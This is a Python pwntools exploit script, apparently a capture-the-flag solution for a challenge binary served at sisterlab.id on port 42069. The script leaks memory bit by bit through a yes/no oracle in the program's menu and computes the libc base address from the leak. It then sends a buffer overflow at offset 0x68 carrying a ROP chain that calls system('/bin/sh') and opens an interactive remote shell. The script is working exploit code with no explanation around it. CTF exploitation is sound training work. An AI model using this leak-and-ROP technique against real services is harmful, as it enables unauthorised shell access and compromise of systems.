#!/usr/bin/env python3

from pwn import *

context.terminal = "wt.exe -w 0 sp -p kali-linux -- wsl --cd".split() + [os.getcwd()]
context.encoding = "utf-8"


def start(argv=None, *a, local=None, remote=None, debug=None, **kw):
    argv = argv or [exe.path]
    local, remote, debug = local or {}, remote or {}, debug or {}

    if args.LOCAL and args.GDB:
        io = gdb.debug(argv, gdbscript=gdbscript, *a, **debug, **kw)
    elif args.LOCAL:
        io = process(argv, *a, **local, **kw)
    else:
        io = connect(host, port, *a, **remote, **kw)
    if args.GDB and not args.LOCAL:
        pid = int(subprocess.check_output(["pgrep", "chall"]))
        sysroot = f"/proc/{pid}/root"
        attach(pid, gdbscript=gdbscript, sysroot=sysroot, exe="chall", *a, **debug, **kw)

    return io


gdbscript = """
b main
c
"""
host, port = args.HOST or "sisterlab.id", args.PORT or 42069
exe = context.binary = ELF(args.EXE or "./client", False)
libc = ELF("./libc.so.6", False)

io = start()

n = 30
io.sendlineafter("> ", str(n))
for i in range(n):
    leaked = 0
    bit = 63
    while bit >= 0:
        io.sendlineafter("> ", "y")
        io.sendlineafter("> ", "4")
        io.sendlineafter("> ", str(1 << bit))
        io.sendlineafter("> ", str(leaked >> bit | 1))
        resp = io.recvline()
        if b"Nope" not in resp:
            leaked |= 1 << bit
        bit -= 1
    log.info(f"numbers[{i}] = {hex(leaked)}")
    io.sendlineafter("> ", "n")
    io.sendlineafter("> ", str(leaked))

libc.address = leaked - (libc.sym["__libc_start_call_main"] + 122)
log.info(f"{hex(libc.address) = }")

rop = ROP(libc)
rop.call(rop.ret)  # stack alignment
rop.system(next(libc.search(b"/bin/sh\0")))

io.sendlineafter("> ", flat({0x68: rop.chain()}))

io.interactive()
